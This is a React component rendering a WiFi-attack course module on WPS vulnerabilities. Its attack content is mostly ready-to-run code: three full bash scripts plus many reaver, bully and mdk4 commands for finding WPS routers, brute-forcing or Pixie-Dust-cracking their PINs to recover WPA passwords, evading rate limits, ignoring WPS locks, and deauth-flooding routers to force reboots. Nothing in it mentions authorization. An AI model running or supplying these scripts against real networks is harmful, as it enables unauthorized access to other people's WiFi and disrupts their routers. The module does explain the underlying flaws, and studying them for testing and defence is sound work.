import { Shield, AlertTriangle, Check, Info, Key, Zap, Clock } from "lucide-react";
import { CommandBlock } from "../CommandBlock";
import { ScriptBlock } from "../ScriptBlock";

export const WPSAttacks = () => {
  const wpsScript = `#!/bin/bash
# WPS Vulnerability Assessment Script
# Identifies and attacks WPS-enabled networks
# Usage: sudo bash wps_attack.sh <interface> [bssid] [channel]

set -e

INTERFACE=\${1:-wlan1mon}
BSSID=\${2:-""}
CHANNEL=\${3:-""}

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
CYAN='\\033[0;36m'
NC='\\033[0m'

print_status() { echo -e "\${CYAN}[*]\${NC} \$1"; }
print_success() { echo -e "\${GREEN}[+]\${NC} \$1"; }
print_warning() { echo -e "\${YELLOW}[!]\${NC} \$1"; }
print_error() { echo -e "\${RED}[-]\${NC} \$1"; }

OUTPUT_DIR="./wps_attack_\$(date +%Y%m%d_%H%M%S)"
mkdir -p "\$OUTPUT_DIR"

echo "=========================================="
echo "     WPS Vulnerability Assessment"
echo "=========================================="
echo ""

# Check for required tools
for tool in reaver wash bully; do
    if ! command -v \$tool &>/dev/null; then
        print_status "Installing \$tool..."
        sudo apt install -y reaver bully 2>/dev/null || true
    fi
done

# Verify monitor mode
MODE=\$(iwconfig \$INTERFACE 2>/dev/null | grep -oP 'Mode:\\K\\w+' || echo "Unknown")
if [ "\$MODE" != "Monitor" ]; then
    print_warning "Interface not in monitor mode. Attempting to enable..."
    sudo ip link set \${INTERFACE%mon} down 2>/dev/null || true
    sudo iw dev \${INTERFACE%mon} set type monitor 2>/dev/null || true
    sudo ip link set \${INTERFACE%mon} up 2>/dev/null || true
    INTERFACE=\${INTERFACE%mon}
fi

if [ -z "\$BSSID" ]; then
    print_status "Phase 1: Scanning for WPS-enabled networks..."
    echo ""
    
    # Scan with wash
    timeout 30 wash -i \$INTERFACE 2>/dev/null | tee "\$OUTPUT_DIR/wps_scan.txt" &
    WASH_PID=\$!
    
    sleep 30
    kill \$WASH_PID 2>/dev/null || true
    
    echo ""
    print_success "WPS Scan Results:"
    echo "=========================================="
    cat "\$OUTPUT_DIR/wps_scan.txt"
    echo ""
    
    # Count vulnerable networks
    WPS_COUNT=\$(grep -c "Yes" "\$OUTPUT_DIR/wps_scan.txt" 2>/dev/null || echo "0")
    LOCKED_COUNT=\$(grep -c "No" "\$OUTPUT_DIR/wps_scan.txt" 2>/dev/null || echo "0")
    
    print_status "WPS Enabled (unlocked): \$WPS_COUNT"
    print_status "WPS Locked: \$LOCKED_COUNT"
    
    if [ "\$WPS_COUNT" -gt 0 ]; then
        print_success "Vulnerable networks found!"
        print_status "Run again with BSSID and channel to attack:"
        echo "  \$0 \$INTERFACE <BSSID> <CHANNEL>"
    else
        print_warning "No unlocked WPS networks found"
    fi
else
    # Attack specific target
    print_status "Phase 2: Attacking WPS on \$BSSID (Channel: \$CHANNEL)"
    echo ""
    
    # Set channel if specified
    if [ -n "\$CHANNEL" ]; then
        iw dev \$INTERFACE set channel \$CHANNEL
    fi
    
    # Check WPS status first
    print_status "Checking WPS status..."
    timeout 10 wash -i \$INTERFACE -C 2>/dev/null | grep "\$BSSID" || true
    echo ""
    
    # Try Reaver first
    print_status "Starting Reaver attack..."
    print_warning "This may take 4-10 hours depending on rate limiting"
    print_status "Output will be saved to \$OUTPUT_DIR/"
    echo ""
    
    reaver -i \$INTERFACE \\
        -b \$BSSID \\
        -c \$CHANNEL \\
        -vv \\
        -K 1 \\
        -N \\
        -d 0 \\
        -T 1 \\
        -r 3:15 \\
        -o "\$OUTPUT_DIR/reaver_output.txt" 2>&1 | tee -a "\$OUTPUT_DIR/reaver_log.txt"
    
    # Check for success
    if grep -q "WPA PSK:" "\$OUTPUT_DIR/reaver_output.txt" 2>/dev/null; then
        print_success "WPS PIN CRACKED!"
        grep -E "WPS PIN:|WPA PSK:" "\$OUTPUT_DIR/reaver_output.txt"
    else
        print_warning "Reaver attack incomplete or failed"
        print_status "Try bully as an alternative"
    fi
fi

echo ""
print_status "Results saved to \$OUTPUT_DIR/"`;

  const bullyScript = `#!/bin/bash
# Bully WPS Attack Script
# Alternative to Reaver with different approach
# Usage: sudo bash bully_attack.sh <bssid> <channel> <interface>

BSSID=\${1:?"Usage: \$0 <BSSID> <CHANNEL> <INTERFACE>"}
CHANNEL=\${2:?"Please specify channel"}
INTERFACE=\${3:-wlan1mon}

echo "=========================================="
echo "        Bully WPS Attack"
echo "=========================================="
echo ""

# Check for bully
if ! command -v bully &>/dev/null; then
    echo "[*] Installing bully..."
    sudo apt install -y bully
fi

# Set channel
iw dev \$INTERFACE set channel \$CHANNEL 2>/dev/null || true

echo "[*] Target: \$BSSID on channel \$CHANNEL"
echo "[*] Starting Bully attack..."
echo "[!] This may take several hours"
echo ""

# Bully with optimized settings
bully \$INTERFACE \\
    -b \$BSSID \\
    -c \$CHANNEL \\
    -v 3 \\
    -S \\
    -L \\
    -F \\
    -B \\
    -p 10 \\
    -r 3 \\
    -T 0.5`;

  const pixiedustScript = `#!/bin/bash
# Pixie Dust Attack Script
# Offline WPS attack (much faster than online brute force)
# Usage: sudo bash pixiedust.sh <bssid> <channel> <interface>

BSSID=\${1:?"Usage: \$0 <BSSID> <CHANNEL> <INTERFACE>"}
CHANNEL=\${2:?"Please specify channel"}
INTERFACE=\${3:-wlan1mon}

echo "=========================================="
echo "      Pixie Dust WPS Attack"
echo "=========================================="
echo ""
echo "[*] Target: \$BSSID"
echo "[*] This attack exploits weak random number generation"
echo "[*] If vulnerable, PIN is recovered in seconds to minutes!"
echo ""

# Set channel
iw dev \$INTERFACE set channel \$CHANNEL

# Reaver with Pixie Dust
echo "[*] Starting Pixie Dust attack..."
reaver -i \$INTERFACE \\
    -b \$BSSID \\
    -c \$CHANNEL \\
    -K 1 \\
    -vvv

# Check result
if [ \$? -eq 0 ]; then
    echo ""
    echo "[+] Attack successful! Check output above for PIN and WPA key."
else
    echo ""
    echo "[-] Pixie Dust attack failed."
    echo "[*] This AP may not be vulnerable to Pixie Dust."
    echo "[*] Try online brute force: reaver -i \$INTERFACE -b \$BSSID -vv"
fi`;

  return (
    <section className="py-16">
      <div className="container mx-auto px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-10 h-10 rounded-lg bg-primary/20 flex items-center justify-center">
              <Shield className="w-5 h-5 text-primary" />
            </div>
            <div>
              <span className="text-xs font-mono text-primary">MODULE 07</span>
              <h2 className="text-2xl font-bold text-foreground">WPS Vulnerabilities</h2>
            </div>
          </div>

          <p className="text-muted-foreground mb-8">
            WiFi Protected Setup (WPS) was designed to make WiFi configuration easier, but it introduced 
            severe security vulnerabilities. This module covers WPS PIN brute forcing and the Pixie Dust 
            attack, which can often recover the WPA password in minutes.
          </p>

          {/* Theory Section */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Info className="w-5 h-5 text-primary" />
              Understanding WPS Vulnerabilities
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">WPS PIN Design Flaw:</strong> The 8-digit PIN is verified in 
                two halves. The first 4 digits (10,000 combinations) are checked before the last 4. The 8th digit 
                is a checksum. This reduces the keyspace from 10^8 to ~11,000 attempts.
              </p>
              <p>
                <strong className="text-foreground">Online Brute Force:</strong> Try PINs until the correct one is 
                found. At 1 attempt per second, this takes 4-10 hours depending on rate limiting.
              </p>
              <p>
                <strong className="text-foreground">Pixie Dust Attack:</strong> Many routers use weak random number 
                generators for WPS key exchange. By capturing the exchange, we can calculate the PIN offline in 
                seconds. This affects many Ralink, Broadcom, and Realtek chipsets.
              </p>
            </div>
          </div>

          {/* Attack Types */}
          <div className="grid md:grid-cols-2 gap-4 mb-8">
            <div className="p-5 rounded-xl border border-border bg-card">
              <div className="flex items-start gap-3">
                <Clock className="w-8 h-8 text-warning flex-shrink-0" />
                <div>
                  <h3 className="font-semibold text-foreground mb-1">Online Brute Force</h3>
                  <p className="text-sm text-muted-foreground">
                    Try all possible PINs. Takes 4-10 hours. Works on all WPS-enabled routers.
                  </p>
                </div>
              </div>
            </div>
            <div className="p-5 rounded-xl border border-border bg-card">
              <div className="flex items-start gap-3">
                <Zap className="w-8 h-8 text-success flex-shrink-0" />
                <div>
                  <h3 className="font-semibold text-foreground mb-1">Pixie Dust (Offline)</h3>
                  <p className="text-sm text-muted-foreground">
                    Exploits weak RNG. Takes seconds to minutes. Only works on vulnerable chipsets.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Prerequisites */}
          <div className="p-4 rounded-lg border border-warning/50 bg-warning/10 mb-8">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-warning flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-medium text-warning mb-1">Prerequisites</h4>
                <ul className="text-sm text-muted-foreground space-y-1">
                  <li>• Target router must have WPS enabled (many do by default)</li>
                  <li>• WPS must not be locked (some routers lock after failed attempts)</li>
                  <li>• Monitor mode enabled (Module 02)</li>
                  <li>• reaver and bully installed</li>
                </ul>
              </div>
            </div>
          </div>

          {/* Phase 1: Discovery */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Phase 1: WPS Network Discovery</h3>
          <p className="text-sm text-muted-foreground mb-4">
            First, identify which networks have WPS enabled and are vulnerable.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo wash -i wlan1mon"
              description="Scan for WPS-enabled networks"
              explanation="wash (from reaver package) specifically scans for WPS. Shows BSSID, channel, WPS version, and lock status."
              output={`Wash v1.6.5 WiFi Protected Setup Scan Tool

BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
AA:BB:CC:DD:EE:01    6  -45  2.0  No   Ralink    TargetNetwork
AA:BB:CC:DD:EE:02   11  -67  1.0  Yes  Broadcom  NeighborWiFi
AA:BB:CC:DD:EE:03    1  -78  2.0  No   Realtek   GuestNetwork`}
            />

            <CommandBlock
              command="sudo airodump-ng wlan1mon --wps"
              description="Alternative: airodump-ng with WPS info"
              explanation="Standard airodump-ng can also show WPS status with the --wps flag."
            />

            <CommandBlock
              command="sudo wash -i wlan1mon -C"
              description="Scan with 2GHz and 5GHz"
              explanation="-C enables channel hopping across both bands. Slower but more comprehensive."
            />
          </div>

          {/* Understanding wash output */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Understanding wash Output</h3>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-border">
                    <th className="text-left py-2 pr-4 text-primary font-mono">Column</th>
                    <th className="text-left py-2 text-foreground">Description</th>
                  </tr>
                </thead>
                <tbody className="text-muted-foreground">
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">WPS</td>
                    <td className="py-2">WPS version (1.0 or 2.0). Both are vulnerable.</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-success">Lck: No</td>
                    <td className="py-2">WPS is UNLOCKED - vulnerable to attack!</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-destructive">Lck: Yes</td>
                    <td className="py-2">WPS is LOCKED - router detected attacks and disabled WPS temporarily</td>
                  </tr>
                  <tr>
                    <td className="py-2 pr-4 font-mono text-primary">Vendor</td>
                    <td className="py-2">Router chipset. Ralink/Realtek often vulnerable to Pixie Dust.</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          {/* Phase 2: Pixie Dust Attack */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Phase 2: Pixie Dust Attack (Fast)</h3>
          <p className="text-sm text-muted-foreground mb-4">
            Always try Pixie Dust first - if the router is vulnerable, you'll have the PIN in seconds.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vvv"
              description="Pixie Dust attack with Reaver"
              explanation="-K 1 enables Pixie Dust mode. -vvv shows verbose output so you can see what's happening. If vulnerable, PIN appears almost immediately."
              output={`[Reaver 1.6.5] Pixie-Dust attack...

[*] Trying pin "12345670"
[*] Received M1 message
[*] Received M3 message
[+] Pixie-Dust attack successful!
[+] WPS PIN: 12345670
[+] WPA PSK: SuperSecretPassword123
[+] AP SSID: TargetNetwork`}
            />

            <CommandBlock
              command="sudo bully wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3"
              description="Pixie Dust with Bully"
              explanation="-d enables Pixie Dust mode in bully. Bully sometimes works when reaver fails."
            />
          </div>

          {/* Phase 3: Online Brute Force */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Phase 3: Online Brute Force (Slow)</h3>
          <p className="text-sm text-muted-foreground mb-4">
            If Pixie Dust fails, fall back to online brute force. This is slow but works on all WPS routers.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -vv"
              description="Basic Reaver brute force"
              explanation="Without -K, reaver performs online PIN brute force. Shows progress and estimated time."
              output={`[Reaver 1.6.5]

[*] Waiting for beacon from AA:BB:CC:DD:EE:FF
[*] Associated with AA:BB:CC:DD:EE:FF (ESSID: TargetNetwork)
[*] Trying pin 12345670
[*] Trying pin 00005678
[+] 0.02% complete @ 2024-01-15 16:30:45 (3 seconds/attempt)
[*] Trying pin 01235678
...`}
            />

            <CommandBlock
              command="sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -N -d 0 -T 1"
              description="Aggressive Reaver (faster but risky)"
              explanation="-N disables NACK detection, -d 0 no delay between PINs, -T 1 short timeout. Faster but may trigger rate limiting."
            />

            <CommandBlock
              command="sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -r 3:15"
              description="Reaver with rate limiting evasion"
              explanation="-r 3:15 sleeps for 15 seconds every 3 attempts. Slower but avoids triggering WPS lock on some routers."
            />

            <CommandBlock
              command="sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -p 01234567"
              description="Resume with known PIN prefix"
              explanation="-p lets you start from a specific PIN. Useful for resuming interrupted attacks."
            />
          </div>

          {/* Bully Alternative */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Alternative: Bully</h3>
          <p className="text-sm text-muted-foreground mb-4">
            Bully is an alternative WPS attack tool that uses a different implementation.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install bully"
              description="Install Bully"
              explanation="Bully is in Kali repositories. Sometimes works better than reaver against certain routers."
            />

            <CommandBlock
              command="sudo bully wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3"
              description="Basic Bully attack"
              explanation="Similar to reaver but different protocol implementation. Try if reaver has issues."
            />

            <CommandBlock
              command="sudo bully wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -S -L -F -B"
              description="Bully with optimizations"
              explanation="-S uses small DH keys (faster), -L ignores locked state, -F fixed channel, -B bruteforce mode."
            />
          </div>

          {/* WPS Lock Bypass */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Dealing with WPS Lock</h3>
          <p className="text-sm text-muted-foreground mb-4">
            Many routers lock WPS after detecting brute force attempts. Here's how to handle it.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo wash -i wlan1mon | grep -E 'BSSID|AA:BB:CC:DD:EE:FF'"
              description="Check WPS lock status"
              explanation="Run wash periodically to check if WPS is still locked. Some routers auto-unlock after 1-24 hours."
            />

            <CommandBlock
              command="sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -L"
              description="Ignore lock state (continue anyway)"
              explanation="-L tells reaver to ignore WPS lock and continue trying. May work if lock is poorly implemented."
            />

            <CommandBlock
              command="sudo mdk4 wlan1mon d -B AA:BB:CC:DD:EE:FF"
              description="Force router reboot (may clear lock)"
              explanation="Aggressive deauth sometimes causes router to reboot, clearing WPS lock. Use sparingly."
            />
          </div>

          {/* Speed Comparison */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Attack Speed Comparison</h3>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-border">
                    <th className="text-left py-2 pr-4 text-primary font-mono">Method</th>
                    <th className="text-left py-2 pr-4 text-foreground">Time</th>
                    <th className="text-left py-2 text-foreground">Success Rate</th>
                  </tr>
                </thead>
                <tbody className="text-muted-foreground">
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-success">Pixie Dust</td>
                    <td className="py-2 pr-4">Seconds to minutes</td>
                    <td className="py-2">~30% of routers vulnerable</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">Online Brute Force (fast)</td>
                    <td className="py-2 pr-4">2-4 hours</td>
                    <td className="py-2">Works if no rate limiting</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-warning">Online Brute Force (slow)</td>
                    <td className="py-2 pr-4">4-10 hours</td>
                    <td className="py-2">Most reliable</td>
                  </tr>
                  <tr>
                    <td className="py-2 pr-4 font-mono text-destructive">With Rate Limiting</td>
                    <td className="py-2 pr-4">10+ hours</td>
                    <td className="py-2">May never complete</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          {/* Automation Scripts */}
          <h3 className="text-lg font-semibold text-foreground mb-4">Automation Scripts</h3>
          <ScriptBlock
            title="WPS Vulnerability Scanner & Attacker"
            filename="wps_attack.sh"
            language="bash"
            description="Complete WPS assessment and attack script. Usage: sudo bash wps_attack.sh wlan1mon [bssid] [channel]"
            code={wpsScript}
          />

          <div className="mt-6">
            <ScriptBlock
              title="Bully WPS Attack"
              filename="bully_attack.sh"
              language="bash"
              description="Bully-based WPS attack. Usage: sudo bash bully_attack.sh AA:BB:CC:DD:EE:FF 6 wlan1mon"
              code={bullyScript}
            />
          </div>

          <div className="mt-6">
            <ScriptBlock
              title="Pixie Dust Attack"
              filename="pixiedust.sh"
              language="bash"
              description="Fast Pixie Dust offline attack. Usage: sudo bash pixiedust.sh AA:BB:CC:DD:EE:FF 6 wlan1mon"
              code={pixiedustScript}
            />
          </div>

          {/* Common Issues */}
          <div className="p-5 rounded-xl border border-warning/50 bg-warning/10 mt-8 mb-8">
            <h3 className="font-semibold text-warning mb-3 flex items-center gap-2">
              <AlertTriangle className="w-5 h-5" />
              Common Issues & Solutions
            </h3>
            <ul className="space-y-2 text-sm text-muted-foreground">
              <li>• <strong className="text-foreground">"WARNING: Failed to associate"</strong> - Get closer to the AP or check channel</li>
              <li>• <strong className="text-foreground">"WPS transaction failed"</strong> - Router may be rate limiting, use -r option</li>
              <li>• <strong className="text-foreground">"WARNING: Detected AP rate limiting"</strong> - Wait or use slower settings</li>
              <li>• <strong className="text-foreground">"Lck: Yes" in wash</strong> - WPS locked, wait for unlock or try -L</li>
              <li>• <strong className="text-foreground">Pixie Dust returns nothing</strong> - Router not vulnerable, use online brute force</li>
            </ul>
          </div>

          {/* Completion Checklist */}
          <div className="mt-8 p-5 rounded-xl border border-success/50 bg-success/10">
            <h4 className="font-semibold text-success mb-3 flex items-center gap-2">
              <Check className="w-5 h-5" />
              Module Completion Checklist
            </h4>
            <ul className="space-y-2 text-sm">
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Scanned for WPS-enabled networks with wash</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Attempted Pixie Dust attack on vulnerable target</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Performed online brute force (or understood process)</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Tested both Reaver and Bully</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Understand WPS lock and bypass techniques</span>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </section>
  );
};
